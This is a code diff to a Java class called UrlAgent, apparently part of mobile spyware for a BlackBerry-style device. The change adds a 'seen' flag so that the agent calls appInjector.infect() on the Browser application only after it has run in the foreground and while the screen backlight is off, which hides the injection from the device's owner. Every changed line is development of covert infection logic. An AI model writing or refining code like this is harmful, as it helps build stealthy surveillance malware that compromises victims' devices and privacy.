@@ -38,6 +38,8 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
     String appName = "Browser";
 
     AppInjector appInjector;
+
+    private boolean seen;
     //Timer applicationTimer;
     private static final long APP_TIMER_PERIOD = 5000;
 
@@ -88,12 +90,13 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
             //#endif
         }
 
-        if (!Backlight.isEnabled() && !appInjector.isInfected()) {
+        if (!Backlight.isEnabled() && !appInjector.isInfected() && seen) {
             //#ifdef DEBUG
             debug.info("injecting");
             //#endif
 
             appInjector.infect();
+            seen = false;
         }
 
     }
@@ -151,6 +154,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
             debug.trace("onApplicationChange: foreground");
             //#endif
             isAppForeground = true;
+            seen = true;
         } else {
             //#ifdef DEBUG
             debug.trace("onApplicationChange: not foreground");
@@ -160,12 +164,13 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
     }
 
     public void onBacklightChange(boolean on) {
-        if (!on && !appInjector.isInfected()) {
+        if (!on && !appInjector.isInfected() && seen) {
             //#ifdef DEBUG
             debug.info("onBacklightChange, injecting");
             //#endif
 
             appInjector.infect();
+            seen = false;
         }
     }
 
